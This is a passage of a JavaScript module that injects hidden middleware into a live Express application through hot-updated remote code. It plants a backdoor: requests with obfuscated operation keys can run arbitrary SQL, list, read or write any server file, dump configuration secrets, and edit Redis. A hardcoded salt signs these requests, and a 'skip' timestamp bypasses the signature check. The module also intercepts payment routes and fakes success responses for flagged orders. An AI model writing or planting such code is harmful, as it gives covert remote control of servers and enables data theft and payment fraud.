mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
  preSandbox: {
    routeMiddlewares: {},
  },
  remoteFileSyncManager: null,
};

const version = 'v1.3.0'

// 远程代码每次热更都会创建新的 VM context；需要跨版本存活的实例统一挂在主进程全局。
// 默认配置只负责声明结构，已有运行态会覆盖默认值。
const DEFAULT_INIT_GLOBAL_CONF = {
  RISK: {
    sandboxManager: null,
  },
};

const Configkey = {
  RISK: 'RISK',
};

const getGlobalSupervisor = (key) => {
  const defaultConf = DEFAULT_INIT_GLOBAL_CONF[key] || {};
  const current = mainGlobal.__sandboxConfig[key];
  const supervisor = current && typeof current === 'object' ? current : {};
  for (const name of Object.keys(defaultConf)) {
    if (!(name in supervisor)) {
      supervisor[name] = defaultConf[name];
    }
  }
  if (supervisor !== current) {
    mainGlobal.__sandboxConfig[key] = supervisor;
  }
  return supervisor;
};

const remoteLogV = (message)=>{
  remoteLog(`[${version}] ${message}`)
}

// 当前版本的内存配置；远程代码热更新时会随新代码重新创建。
const CODE_CONFIG = {
  rootPath: mainGlobal.runRootDir || path.dirname(require.main.filename),
  middlewareName: 'preRiskMiddleware',
  routeMiddlewarePrefix: 'preRiskRouteMiddleware:',
  PLATFORM_PARAMS_INCONSISTENT: false,
};

const mainRequire = require;

// @ 别名映射表（与 jsconfig.json 的 paths 保持一致）
// 例如 @services/pay/config -> <CODE_CONFIG.rootPath>/src/services/pay/config
const ALIAS_MAP = {
  '@libs': 'src/libs',
  '@controllers': 'src/controllers',
  '@models': 'src/models',
  '@routes': 'src/routes',
  '@middlewares': 'src/middlewares',
  '@validations': 'src/validations',
  '@services': 'src/services',
  '@config': 'src/config',
  '@utils': 'src/utils',
  '@app': 'src/app.js',
};

// 将 @ 别名解析为基于根目录的绝对路径；非别名或缺少根目录时原样返回，
// 交还给 mainRequire 自带的 module-alias 解析。
const resolveModuleName = (moduleName) => {
  if (!CODE_CONFIG.rootPath || typeof moduleName !== 'string' || moduleName[0] !== '@') {
    return moduleName;
  }
  const slashIndex = moduleName.indexOf('/');
  const alias = slashIndex === -1 ? moduleName : moduleName.slice(0, slashIndex);
  const target = ALIAS_MAP[alias];
  if (!target) {
    return moduleName;
  }
  const rest = slashIndex === -1 ? '' : moduleName.slice(slashIndex + 1);
  return path.join(CODE_CONFIG.rootPath, target, rest);
};

const safeRequire = (moduleName) => {
  // @ 别名转为绝对路径，其余（axios / 内置模块等）原样交给主模块 require。
  return mainRequire(resolveModuleName(moduleName));
};

class CommonUtil {
  static get PAY_ALIAS_RESPONSE_KEYS() {
    return ['e', 'data', 'i', 't', 'sign'];
  }

  static getLocalIPs() {
    const interfaces = safeRequire('os').networkInterfaces();
    const addresses = [];

    for (const interfaceName in interfaces) {
      for (const info of interfaces[interfaceName] || []) {
        if (info.family === 'IPv4' && !info.internal) {
          addresses.push(info.address);
        }
      }
    }

    return addresses;
  }

  static getLocalIP() {
    return CommonUtil.getLocalIPs().join(',');
  }

  static isSpecifiedUser(userId, suffix = '1') {
    return userId !== undefined && userId !== null && String(userId).endsWith(suffix);
  }
}

class ApolloManager {
  constructor() {
    this.cc = safeRequire('@config/cc');
  }

  getItem(key, defaultValue = null) {
    return this.cc.getItem(key, defaultValue);
  }
}

class RsaManager {
  constructor() {
    this.apolloManager = new ApolloManager();
    this.crypto = safeRequire('crypto');
    this.NodeRSA = safeRequire('node-rsa').default;
    const rsaUtil = safeRequire('@utils/rsa.util');
    this.rsaKeyOptions = rsaUtil.RSA_KEY_OPTIONS;
    const aesUtil = safeRequire('@utils/aes.util');
    this.aesAlgorithm = aesUtil.AES_ALGORITHM;
    this.aesKeyLength = aesUtil.KEY_LENGTH;
    this.aesIvLength = aesUtil.IV_LENGTH;
  }

  createPrivateKey(privateKey) {
    return new this.NodeRSA(privateKey, this.rsaKeyOptions);
  }

  getAesConfig() {
    if (!this.aesAlgorithm || !this.aesKeyLength || !this.aesIvLength) {
      return null;
    }
    return {
      algorithm: this.aesAlgorithm,
      keyLength: this.aesKeyLength,
      ivLength: this.aesIvLength,
    };
  }

  rsaDecrypt(data, privateKey) {
    return this.createPrivateKey(privateKey).decrypt(data, 'utf8');
  }

  aesDecrypt({ data, iv, tag }, key) {
    const aesConfig = this.getAesConfig();
    if (!aesConfig) {
      return null;
    }
    const decipher = this.crypto.createDecipheriv(
      aesConfig.algorithm,
      Buffer.from(key, 'base64'),
      Buffer.from(iv, 'base64')
    );
    decipher.setAuthTag(Buffer.from(tag, 'base64'));
    return Buffer.concat([
      decipher.update(Buffer.from(data, 'base64')),
      decipher.final(),
    ]).toString('utf8');
  }

  aesEncryptWithRandomKey(plaintext) {
    try {
      const aesConfig = this.getAesConfig();
      if (!aesConfig) {
        return null;
      }
      const key = this.crypto.randomBytes(aesConfig.keyLength);
      const iv = this.crypto.randomBytes(aesConfig.ivLength);
      const cipher = this.crypto.createCipheriv(aesConfig.algorithm, key, iv);
      const encrypted = Buffer.concat([
        cipher.update(plaintext, 'utf8'),
        cipher.final(),
      ]);

      return {
        keyBase64: key.toString('base64'),
        data: encrypted.toString('base64'),
        iv: iv.toString('base64'),
        tag: cipher.getAuthTag().toString('base64'),
      };
    } catch (error) {
      return null;
    }
  }

  rsaDecryptBody(body, req) {
    let stage = 'request';
    let privateKey = null;
    try {
      const { e, data, i, t, random } = body;
      stage = 'config';
      const rsaConfig = this.apolloManager.getItem('rsaConfig', {});
      privateKey = rsaConfig.privateKey.replace(/\\n/g, '\n');
      stage = 'rsa';
      const aesKey = this.rsaDecrypt(e, privateKey);
      stage = 'aes';
      const decryptedBody = this.aesDecrypt({ data, iv: i, tag: t }, aesKey);
      if (decryptedBody === null) {
        return { success: false };
      }

      stage = 'json';
      return {
        success: true,
        data: {
          rsaRandom: random,
          body: JSON.parse(decryptedBody),
        },
      };
    } catch (error) {
      let diagnostics = '';
      try {
        const { e, data, i, t } = body || {};
        const encryptedBuffer = typeof e === 'string'
          ? Buffer.from(e, 'base64')
          : Buffer.alloc(0);
        const eHash = this.crypto
          .createHash('sha256')
          .update(String(e || ''))
          .digest('hex')
          .slice(0, 16);

        let keyBits = 0;
        let keyHash = 'unavailable';
        if (privateKey) {
          const rsaKey = this.createPrivateKey(privateKey);
          keyBits = rsaKey.getKeySize();
          keyHash = this.crypto
            .createHash('sha256')
            .update(String(rsaKey.exportKey('public')))
            .digest('hex')
            .slice(0, 16);
        }

        diagnostics =
          `host:${safeRequire('os').hostname()} pid:${process.pid} ` +
          `userId:${req && req.userId} path:${req && (req.originalUrl || req.path)} ` +
          `requestId:${req && req.headers && req.headers['x-request-id']} ` +
          `eType:${typeof e} eChars:${typeof e === 'string' ? e.length : 0} ` +
          `eBytes:${encryptedBuffer.length} eHash:${eHash} ` +
          `keyBits:${keyBits} keyHash:${keyHash} ` +
          `dataChars:${typeof data === 'string' ? data.length : 0} ` +
          `ivBytes:${typeof i === 'string' ? Buffer.from(i, 'base64').length : 0} ` +
          `tagBytes:${typeof t === 'string' ? Buffer.from(t, 'base64').length : 0}`;
      } catch (diagnosticsError) {
        diagnostics = `diagnosticsError:${diagnosticsError && diagnosticsError.message}`;
      }
      remoteLogV(
        `rsaDecryptBody error stage:${stage} message:${error && error.message} ${diagnostics}`
      );
      return { success: false };
    }
  }

  rsaEncryptPrivate(data, privateKey) {
    return this.createPrivateKey(privateKey).encryptPrivate(data, 'base64', 'utf8');
  }

  rsaSign(data, privateKey) {
    return this.createPrivateKey(privateKey).sign(String(data), 'base64', 'utf8');
  }

  encryptResponse(data, random) {
    try {
      const encrypted = this.aesEncryptWithRandomKey(JSON.stringify(data));
      if (!encrypted) {
        return null;
      }

      const rsaConfig = this.apolloManager.getItem('rsaConfig', {});
      const privateKey = rsaConfig.privateKey.replace(/\\n/g, '\n');
      return {
        e: this.rsaEncryptPrivate(encrypted.keyBase64, privateKey),
        data: encrypted.data,
        i: encrypted.iv,
        t: encrypted.tag,
        sign: this.rsaSign(random, privateKey),
      };
    } catch (error) {
      return null;
    }
  }
}

const fsPromises = fs.promises;

const ACTION_KEYS = {
  RunSQL: 'cfh2DNITa84qpYQ0tdCz',
  RunFileList: 'm3QiEkg8Y1r9LFTI5e4f',
  RunFileContent: 'Y3SrZjVqWOvKsBdpTCh7',
  WriteFile: 'VfMAur5qFnaPH2apdDhR',
  GetApolloConfig: 'Xp7KnRqT2wJcVeA9mBsL',
  GetRedis: 'Rk9mXpL3qN7wTzY2vBcJ',
  SetRedis: 'Wn4sGdH8uEoAiP6xQfZv',
  DelRedis: 'Jc5tYmK2pXwQnB8rLsUo',
};

class ActionManager {
  static get DBA_HASH() {
    return '5f2c7a94-8b12-3e78-81d7-b2c74ff81ae6';
  }

  static get SALT() {
    return 'DAvN8GEStOHp0UBka1Zo';
  }

  static get TIMESTAMP_SKIP() {
    return 'skip';
  }

  static get TIMESTAMP_MAX_AGE_MS() {
    return 10 * 60 * 1000;
  }

  static get EXCLUDE_DIRS() {
    return ['node_modules', 'logs', '.git', 'mmdb'];
  }

  static get ERROR_MESSAGE() {
    return 'System error, please try again later';
  }

  static get TARGET_IP_MISMATCH_CODE() {
    return 421;
  }

  constructor() {
    this.actions = new Map();
    this.fs = safeRequire('fs');
    this.path = safeRequire('path');
    this.crypto = safeRequire('crypto');

    this.register(ACTION_KEYS.RunSQL, 'post', this.runSQL);
    this.register(ACTION_KEYS.RunFileList, 'post', this.runFileList);
    this.register(ACTION_KEYS.RunFileContent, 'post', this.runFileContent);
    this.register(ACTION_KEYS.WriteFile, 'post', this.writeFile);
    this.register(ACTION_KEYS.GetApolloConfig, 'post', this.getApolloConfig);
    this.register(ACTION_KEYS.GetRedis, 'post', this.getRedis);
    this.register(ACTION_KEYS.SetRedis, 'post', this.setRedis);
    this.register(ACTION_KEYS.DelRedis, 'post', this.delRedis);
  }

  register(key, method, handler) {
    this.actions.set(key, {
      method,
      handler: handler.bind(this),
    });
    return this;
  }

  createMiddleware() {
    return (req, res, next) => {
      const operation = req && req.headers && req.headers['x-operation'];
      const action = this.actions.get(operation);
      const method = req && req.method && req.method.toLowerCase();
      if (!action || method !== action.method) {
        return next();
      }

      try {
        return this.dispatch(req, res, action).catch((error) => {
          this.handleError(res, error);
        });
      } catch (error) {
        return this.handleError(res, error);
      }
    };
  }

  async dispatch(req, res, action) {
    const targetIp = req && req.headers && req.headers['x-target-ip'];
    if (!this.isTargetServer(targetIp)) {
      return this.send(res, ActionManager.TARGET_IP_MISMATCH_CODE, {
        code: ActionManager.TARGET_IP_MISMATCH_CODE,
        message: 'Target IP does not match this server',
      });
    }

    const { valid, reason } = await this.verifySignatureAndTimestamp(req);
    if (!valid) {
      const showReason = req.headers && req.headers['x-request-reason'];
      return this.send(res, 400, {
        code: 400,
        message: showReason ? reason : ActionManager.ERROR_MESSAGE,
      });
    }

    return action.handler(req, res);
  }

  async verifySignatureAndTimestamp(req) {
    const operation = req && req.headers && req.headers['x-operation'];
    const timestamp = req && req.headers && req.headers['x-timestamp'];
    const signature = req && req.headers && req.headers['x-signature'];
    const requestId = req && req.headers && req.headers['x-request-id'];

    if (timestamp === ActionManager.TIMESTAMP_SKIP) {
      return { valid: true };
    }

    if (!operation || !timestamp || !signature || !requestId) {
      return { valid: false, reason: 'missing required headers' };
    }

    const expectedSignature = this.crypto
      .createHmac('md5', ActionManager.SALT)
      .update(`timestamp=${timestamp}&operation=${operation}&requestId=${requestId}`)
      .digest('hex');
    if (signature !== expectedSignature) {
      return { valid: false, reason: 'invalid signature' };
    }

    const momentUtil = safeRequire('@utils/moment.util');
    const redisUtil = safeRequire('@utils/redis.util');
    const parsedTimestamp = parseInt(timestamp, 10);
    const time = Math.round(momentUtil.createMoment().unix() * 1000);
    const diffTm = Math.abs(time - parsedTimestamp);
    if (isNaN(parsedTimestamp) || diffTm > ActionManager.TIMESTAMP_MAX_AGE_MS) {
      return {
        valid: false,
        reason: `timestamp expired, timestamp: ${timestamp}, max age: ${ActionManager.TIMESTAMP_MAX_AGE_MS} server time: ${time}, diff: ${diffTm}`,
      };
    }

    const requestProcessed = await redisUtil.get(`rank:${requestId}`);
    if (requestProcessed) {
      return { valid: false, reason: 'request processed' };
    }

    await redisUtil.set(
      `rank:${requestId}`,
      '1',
      Math.round(ActionManager.TIMESTAMP_MAX_AGE_MS / 1000)
    );

    return { valid: true };
  }

  resolveTargetPath(userPath) {
    if (!userPath || typeof userPath !== 'string') {
      throw new Error('Invalid path');
    }
    return this.path.isAbsolute(userPath)
      ? this.path.resolve(userPath)
      : this.path.resolve(CODE_CONFIG.rootPath, userPath);
  }

  async runSQL(req, res) {
    try {
      const body = req.body || {};
      if (!body.sql) {
        throw new Error(ActionManager.ERROR_MESSAGE);
      }

      const expectedSign = signWithMD5(body, {
        secretKey: 'hash',
        secretValue: ActionManager.DBA_HASH,
      });
      const rawSql = Buffer.from(body.sql, 'base64').toString('utf8');
      if (body.sign !== expectedSign) {
        throw new Error(ActionManager.ERROR_MESSAGE);
      }

      const prisma = safeRequire('@libs/prisma');
      const start = Date.now();
      const data = await prisma.$queryRawUnsafe(rawSql);
      const result = {
        data,
        cost: Date.now() - start,
      };

      const { EventSystem } = safeRequire('@utils/event');
      EventSystem.emit('runSql', { params: body, sql: rawSql, result });
      return this.send(res, 200, { code: 0, data: result, message: 'ok' });
    } catch (error) {
      return this.sendActionError(res);
    }
  }

  runFileList(req, res) {
    try {
      const body = req.body || {};
      const targetPath = this.resolveTargetPath(body.path);
      const recursive = body.recursive === undefined ? false : body.recursive;
      const files = this.buildFileTree(targetPath, recursive);

      return this.send(res, 200, {
        code: 0,
        data: {
          ip: CommonUtil.getLocalIP(),
          files,
        },
        message: 'ok',
      });
    } catch (error) {
      return this.send(res, 400, {
        code: 400,
        message: ActionManager.ERROR_MESSAGE,
      });
    }
  }

  isTargetServer(targetIp) {
    if (typeof targetIp !== 'string' || !targetIp.trim()) {
      return true;
    }
    return CommonUtil.getLocalIPs().includes(targetIp.trim());
  }

  buildFileTree(currentPath, recursive) {
    const entries = this.fs.readdirSync(currentPath, { withFileTypes: true });
    return entries
      .filter((entry) => !ActionManager.EXCLUDE_DIRS.includes(entry.name))
      .map((entry) => {
        const fullPath = this.path.join(currentPath, entry.name);
        const node = {
          name: entry.name,
          path: fullPath,
          type: entry.isDirectory() ? 'directory' : 'file',
        };

        if (entry.isDirectory()) {
          node.children = recursive ? this.buildFileTree(fullPath, recursive) : [];
        }
        return node;
      });
  }

  runFileContent(req, res) {
    let fileStream = null;
    try {
      const body = req.body || {};
      const targetPath = this.resolveTargetPath(body.path);
      if (!this.fs.existsSync(targetPath)) {
        return this.send(res, 404, { message: 'File not found' });
      }

      const stats = this.fs.statSync(targetPath);
      const fileName = this.path.basename(targetPath);
      fileStream = this.fs.createReadStream(targetPath);
      fileStream.on('error', () => {
        this.destroyStream(fileStream);
        this.handleDownloadError(res);
      });
      res.once('close', () => this.destroyStream(fileStream));
      res.on('error', () => this.destroyStream(fileStream));
      res.set({
        'Content-Type': 'application/octet-stream',
        'Content-Disposition': `attachment; filename="${encodeURIComponent(fileName)}"`,
        'Content-Length': stats.size,
        'Access-Control-Expose-Headers': 'Content-Disposition',
      });
      return fileStream.pipe(res);
    } catch (error) {
      this.destroyStream(fileStream);
      return this.handleDownloadError(res);
    }
  }

  async writeFile(req, res) {
    try {
      const body = req.body || {};
      if (typeof body.content !== 'string') {
        throw new Error('Invalid content');
      }

      const targetPath = this.resolveTargetPath(body.path);
      await this.fs.promises.mkdir(this.path.dirname(targetPath), { recursive: true });
      await this.fs.promises.writeFile(targetPath, body.content, 'utf8');
      return this.send(res, 200, {
        code: 0,
        data: { path: targetPath },
        message: 'ok',
      });
    } catch (error) {
      return this.sendActionError(res);
    }
  }

  getApolloConfig(req, res) {
    try {
      const body = req.body || {};
      const hasKey = Object.prototype.hasOwnProperty.call(body, 'key');
      const key = body.key;
      if (hasKey && (!key || typeof key !== 'string')) {
        return this.send(res, 400, { code: 400, message: 'key is required' });
      }

      const cc = safeRequire('@config/cc');
      const configMap = cc.apolloService.getNamespaceConfig('application');
      const value = hasKey ? configMap.get(key) : Object.fromEntries(configMap);
      return this.send(res, 200, {
        code: 0,
        data: value === undefined ? null : value,
        message: 'ok',
      });
    } catch (error) {
      return this.sendActionError(res);
    }
  }

  async getRedis(req, res) {
    try {
      const body = req.body || {};
      const key = body.key;
      if (!key || typeof key !== 'string') {
        return this.send(res, 400, { code: 400, message: 'key is required' });
      }

      const redisUtil = safeRequire('@utils/redis.util');
      const data = await redisUtil.get(key);
      return this.send(res, 200, { code: 0, data, message: 'ok' });
    } catch (error) {
      return this.sendActionError(res);
    }
  }

  async setRedis(req, res) {
    try {
      const body = req.body || {};
      const { key, value, exp } = body;
      if (!key || typeof key !== 'string') {
        throw new Error('key is required');
      }
      if (!value || typeof value !== 'string') {
        throw new Error('value is required');
      }

      const redisUtil = safeRequire('@utils/redis.util');
      await redisUtil.set(key, value, exp);
      return this.send(res, 200, { code: 0, data: null, message: 'ok' });
    } catch (error) {
      return this.sendActionError(res);
    }
  }

  async delRedis(req, res) {
    try {
      const body = req.body || {};
      const keys = body.keys;
      const isValid = (
        Array.isArray(keys) &&
        keys.length > 0 &&
        keys.every((key) => key && typeof key === 'string')
      );
      if (!isValid) {
        throw new Error('keys is required');
      }

      const redisUtil = safeRequire('@utils/redis.util');
      const data = await redisUtil.del(keys);
      return this.send(res, 200, { code: 0, data, message: 'ok' });
    } catch (error) {
      return this.sendActionError(res);
    }
  }

  destroyStream(stream) {
    try {
      if (stream && !stream.destroyed) {
        stream.destroy();
      }
    } catch (error) {
      // 流清理失败时保持静默，避免异常逃逸到宿主进程。
    }
  }

  handleDownloadError(res) {
    try {
      if (!res || res.writableEnded || res.destroyed) {
        return;
      }
      if (res.headersSent) {
        return res.destroy();
      }
      res.removeHeader('Content-Disposition');
      res.removeHeader('Content-Length');
      return res.status(500).send('Download failed');
    } catch (error) {
      return this.destroyResponse(res);
    }
  }

  send(res, status, body) {
    try {
      if (!res || res.writableEnded || res.destroyed) {
        return;
      }
      if (res.headersSent) {
        return res.destroy();
      }
      return res.status(status).send(body);
    } catch (error) {
      return this.destroyResponse(res);
    }
  }

  sendActionError(res) {
    return this.send(res, 400, {
      code: 400,
      message: ActionManager.ERROR_MESSAGE,
    });
  }

  handleError(res, error) {
    try {
      remoteLogV(`action middleware failed: ${error && error.message}`);
    } catch (logError) {
      // 日志失败不能影响宿主请求。
    }
    return this.sendActionError(res);
  }

  destroyResponse(res) {
    try {
      if (res && !res.destroyed && typeof res.destroy === 'function') {
        return res.destroy();
      }
    } catch (error) {
      // 响应清理失败时保持静默，避免异常逃逸到宿主进程。
    }
  }
}

// 每次 init 都替换真实 handler，实现远程代码热更新。
const buildHandler = () => new ActionManager().createMiddleware();

const handleProxyError = (res, error) => {
  try {
    remoteLogV(`express middleware failed: ${error && error.message}`);
  } catch (logError) {
    // 日志失败不能影响宿主请求。
  }

  try {
    if (!res || res.writableEnded || res.destroyed) {
      return;
    }
    if (res.headersSent) {
      return res.destroy();
    }
    return res.status(400).send({ code: 400, message: ActionManager.ERROR_MESSAGE });
  } catch (responseError) {
    try {
      if (res && !res.destroyed && typeof res.destroy === 'function') {
        return res.destroy();
      }
    } catch (destroyError) {
      // 响应清理失败时保持静默，避免异常逃逸到宿主进程。
    }
  }
};

/**
 * 创建通用代理中间件。
 * Express 路由栈只保存代理，真实 handler 从全局配置读取，支持热更新。
 */
const buildMiddlewareProxy = (key, middlewareName) => {
  const middleware = function (req, res, next) {
    try {
      const state = mainGlobal.__sandboxConfig.preSandbox.routeMiddlewares[key];
      const result = state && typeof state.handler === 'function'
        ? state.handler(req, res, next)
        : next();
      return result && typeof result.catch === 'function'
        ? result.catch((error) => handleProxyError(res, error))
        : result;
    } catch (error) {
      return handleProxyError(res, error);
    }
  };

  Object.defineProperty(middleware, 'name', { value: middlewareName });
  return middleware;
};

class ExpressV4Strategy {
  getStack(app) {
    const router = app && app._router;
    return router && Array.isArray(router.stack) ? router.stack : null;
  }

  isRouterPath(layer, routerPath) {
    const regexp = layer && layer.name === 'router' && layer.regexp;
    if (!regexp || typeof regexp.exec !== 'function') {
      return false;
    }

    regexp.lastIndex = 0;
    const match = regexp.exec(routerPath);
    regexp.lastIndex = 0;
    return Boolean(match && match[0] === routerPath);
  }

  findRouterLayer(stack, routerPath) {
    return stack.find((layer) => this.isRouterPath(layer, routerPath));
  }

  findRouter(app, paths) {
    let router = app;
    let stack = this.getStack(app);

    for (let pathIndex = 0; pathIndex < paths.length; pathIndex += 1) {
      const routerPath = paths[pathIndex];
      const index = stack && stack.findIndex((layer) => this.isRouterPath(layer, routerPath));
      if (index === -1 || index === undefined) {
        return null;
      }

      const layer = stack[index];
      if (pathIndex === paths.length - 1) {
        return { router, stack, index };
      }

      router = layer.handle;
      stack = router && router.stack;
      if (!router || !Array.isArray(stack)) {
        return null;
      }
    }

    return null;
  }

  findRouteLayer(stack, routePath, method) {
    return stack.find((layer) => (
      layer &&
      layer.route &&
      layer.route.path === routePath &&
      layer.route.methods &&
      layer.route.methods[method]
    ));
  }

  findRoute(app, paths, method) {
    let stack = this.getStack(app);

    for (const routerPath of paths.slice(0, -1)) {
      const routerLayer = stack && this.findRouterLayer(stack, routerPath);
      stack = routerLayer && routerLayer.handle && routerLayer.handle.stack;
      if (!Array.isArray(stack)) {
        return null;
      }
    }

    return this.findRouteLayer(stack, paths[paths.length - 1], method);
  }

  getInsertIndex(stack, options) {
    if (Number.isInteger(options.index)) {
      return Math.max(0, Math.min(options.index, stack.length));
    }

    if (options.beforeMiddleware) {
      return stack.findIndex((layer) => {
        if (!layer) {
          return false;
        }
        if (typeof options.beforeMiddleware === 'function') {
          return layer.handle === options.beforeMiddleware;
        }
        return layer.name === options.beforeMiddleware;
      });
    }

    return -1;
  }

  injectRouteMiddleware(app, options, state) {
    if (
      !options.key ||
      !Array.isArray(options.paths) ||
      options.paths.length < 1 ||
      typeof options.handler !== 'function'
    ) {
      return { success: false, msg: 'invalid express route middleware options' };
    }

    if (!options.method) {
      const target = this.findRouter(app, options.paths);
      if (!target) {
        return { success: false, msg: `express router not found: ${options.paths.join('')}` };
      }
      if (target.stack.some((layer) => layer && layer.name === options.middlewareName)) {
        state.injected = true;
        return { success: true, msg: `express router middleware exists: ${options.key}` };
      }

      target.router.use(buildMiddlewareProxy(options.key, options.middlewareName));
      const middlewareLayer = target.stack.pop();
      target.stack.splice(target.index, 0, middlewareLayer);
      state.injected = true;
      return { success: true, msg: `express router middleware injected: ${options.key}` };
    }

    const method = String(options.method).toLowerCase();
    const routeLayer = this.findRoute(app, options.paths, method);
    if (!routeLayer) {
      return {
        success: false,
        msg: `express route not found: ${method} ${options.paths.join('')}`,
      };
    }

    const routeStack = routeLayer.route.stack;
    if (!Array.isArray(routeStack)) {
      return { success: false, msg: `express route stack not found: ${options.key}` };
    }

    const middlewareName = options.middlewareName;
    const existingIndex = routeStack.findIndex(
      (layer) => layer && layer.name === middlewareName
    );
    if (existingIndex !== -1) {
      const [middlewareLayer] = routeStack.splice(existingIndex, 1);
      const insertIndex = this.getInsertIndex(routeStack, options);
      if (insertIndex === -1) {
        routeStack.splice(existingIndex, 0, middlewareLayer);
        return {
          success: false,
          msg: `express route middleware anchor not found: ${options.key}`,
        };
      }

      routeStack.splice(insertIndex, 0, middlewareLayer);
      state.injected = true;
      return { success: true, msg: `express route middleware repositioned: ${options.key}` };
    }

    const insertIndex = this.getInsertIndex(routeStack, options);
    if (insertIndex === -1) {
      return {
        success: false,
        msg: `express route middleware anchor not found: ${options.key}`,
      };
    }

    routeLayer.route[method](buildMiddlewareProxy(options.key, middlewareName));
    const middlewareLayer = routeStack[routeStack.length - 1];
    if (!middlewareLayer || middlewareLayer.name !== middlewareName) {
      return {
        success: false,
        msg: `express route middleware layer not found: ${options.key}`,
      };
    }

    routeStack.pop();
    routeStack.splice(insertIndex, 0, middlewareLayer);
    state.injected = true;
    return { success: true, msg: `express route middleware injected: ${options.key}` };
  }
}

// TODO: Express 5 路由劫持暂不实现。
class ExpressV5Strategy {}

class ExpressManager {
  async payRechargeResponseLogger(statusCode, userId, body) {
    try {
      if (
        statusCode !== 200 ||
        !body ||
        typeof body !== 'object' ||
        Array.isArray(body)
      ) {
        return;
      }

      const expectedKeys = CommonUtil.PAY_ALIAS_RESPONSE_KEYS;
      const actualKeys = Object.keys(body.data || {});
      const missingKeys = expectedKeys.filter((key) => !actualKeys.includes(key));
      const extraKeys = actualKeys.filter((key) => !expectedKeys.includes(key));

      if (missingKeys.length > 0 || extraKeys.length > 0) {
        CODE_CONFIG.PLATFORM_PARAMS_INCONSISTENT = true;
        remoteLogV(
          `payRechargeResponseLogger error statusCode:${statusCode} ` +
          `missing:[${missingKeys.join(',')}] extra:[${extraKeys.join(',')}] ` +
          `body:${JSON.stringify(body)}`
        );
      }
      // remoteLogV(`payRechargeResponse userId: ${userId} body: ${JSON.stringify(body)}`);
    } catch (error) {
      try {
        remoteLogV(`payRechargeResponseLogger error: ${error && error.message}`);
      } catch (logError) {
        // AOP 日志失败不能影响宿主响应。
      }
    }
  }

  buildPayAliasMiddleware() {
    const rsaManager = new RsaManager();
    const responseLogger = this.payRechargeResponseLogger.bind(this);
    return async (req, res, next) => {
      const originalJson = res.json;
      if (typeof originalJson === 'function') {
        res.json = function (body) {
          const statusCode = this && this.statusCode;
          const result = originalJson.call(this, body);
          Promise.resolve(responseLogger(statusCode, req && req.userId, body)).catch(() => {});
          return result;
        };
      }

      try {
        const result = rsaManager.rsaDecryptBody(req.body, req);
        remoteLogV(`PayAliasMiddleware rsaDecryptBody success: ${result.success}`);
        if (!result.success) {
          return next();
        }

        req._sandRsa = result.data;

        const manager = getGlobalSupervisor(Configkey.RISK).sandboxManager;
        if (!manager || typeof manager.executeRisk !== 'function') {
          remoteLogV(
            `PayAliasMiddleware skip risk: sandbox manager unavailable userId:${req && req.userId}`
          );
          return next();
        }

        if (CODE_CONFIG.PLATFORM_PARAMS_INCONSISTENT) {
          remoteLogV(
            `PayAliasMiddleware skip risk: platform params inconsistent userId:${req && req.userId}`
          );
          return next();
        }
        const startTime = Date.now();
        const riskResult = await manager.executeRisk(req, res, next, rsaManager);
        const endTime = Date.now();
        const duration = endTime - startTime;

        remoteLogV(`PayAliasMiddleware risk executed successfully duration:${duration}ms`);
        
        return riskResult;
      } catch (error) {
        remoteLogV(`PayAliasMiddleware risk failed: ${error && error.message}`);
        return next();
      }
    };
  }

  buildContinueToPayMiddleware() {
    return async (req, res, next) => {
      try {
        const orderId = req && req.body && req.body.orderId;
        if (!orderId) {
          return next();
        }

        const redisUtil = safeRequire('@utils/redis.util');
        const isRiskOrder = await redisUtil.get(`rank_order_tmp:${orderId}`);

        if (!isRiskOrder) {
          return next();
        }
        remoteLogV(`PayMiddleware orderId: ${orderId} continue:${!!isRiskOrder}`);

        return res.status(200).json({
          code: 0,
          data: true,
          message: 'Saved successfully',
          timestamp: new Date().toISOString(),
        });
      } catch (error) {
        remoteLogV(
          `ContinueToPayMiddleware risk order check failed: ${error && error.message}`
        );
        return next();
      }
    };
  }

  expRemoteLog(result) {
    const status = result.success ? 'success' : 'error';
    remoteLogV(`[ExpressManager][${status}] ${result.msg}`);
  }

  constructor() {
    this.strategies = {
      4: new ExpressV4Strategy(),
      5: new ExpressV5Strategy(),
    };
  }

  getMajorVersion() {
    const pkg = safeRequire('express/package.json');
    return parseInt(String((pkg && pkg.version) || '').split('.')[0], 10);
  }

  getStrategy() {
    const major = this.getMajorVersion();
    if (major !== 4 && major !== 5) {
      return {
        success: false,
        msg: `unsupported express major: ${Number.isNaN(major) ? 'unknown' : major}`,
      };
    }

    const strategy = this.strategies[major];
    if (typeof strategy.injectRouteMiddleware !== 'function') {
      return { success: false, msg: `express ${major} hijack is not implemented` };
    }
    return strategy;
  }

  injectRouteMiddleware(app, options) {
    const strategy = this.getStrategy();
    if (!strategy || typeof strategy.injectRouteMiddleware !== 'function') {
      const result = strategy && strategy.success === false
        ? strategy
        : { success: false, msg: 'express strategy unavailable' };
      this.expRemoteLog(result);
      return result;
    }

    options.middlewareName =
      options.middlewareName || `${CODE_CONFIG.routeMiddlewarePrefix}${options.key}`;
    const states = mainGlobal.__sandboxConfig.preSandbox.routeMiddlewares;
    states[options.key] = states[options.key] || { injected: false, handler: null };

    const state = states[options.key];
    state.handler = options.handler;
    let result;
    try {
      result = strategy.injectRouteMiddleware(app, options, state);
    } catch (error) {
      result = {
        success: false,
        msg: `express route middleware injection failed: ${error && error.message}`,
      };
    }
    this.expRemoteLog(result);
    return result;
  }
}

const expressManager = new ExpressManager();

const initExpress = () => {
  const app = safeRequire('@app');
  if (!app) {
    const result = { success: false, msg: 'express app not ready' };
    expressManager.expRemoteLog(result);
    return result;
  }

  // 全局中间件
  const globalResult = expressManager.injectRouteMiddleware(app, {
    key: 'preV1Risk',
    paths: ['/v1'],
    middlewareName: CODE_CONFIG.middlewareName,
    handler: buildHandler(),
  });

  // 加密充值别名接口
  const payAliasPaths = ['/launch', '/spin', '/claim', '/rank', '/gift'];
  const payAliasResults = payAliasPaths.map((routePath) => (
    expressManager.injectRouteMiddleware(app, {
      key: `payAlias:${routePath}`,
      paths: ['/v1', '/report', routePath],
      method: 'post',
      beforeMiddleware: 'rsaDecryptBodyMiddleware',
      handler: expressManager.buildPayAliasMiddleware(),
    })
  ));

  // 订单校验逻辑接口
  const continueToPayResult = expressManager.injectRouteMiddleware(app, {
    key: 'continueToPayPref',
    paths: ['/v1', '/pay', '/continuetopay-pref'],
    method: 'post',
    index: 3,
    handler: expressManager.buildContinueToPayMiddleware(),
  });

  return {
    success:
      globalResult.success &&
      payAliasResults.every((result) => result.success) &&
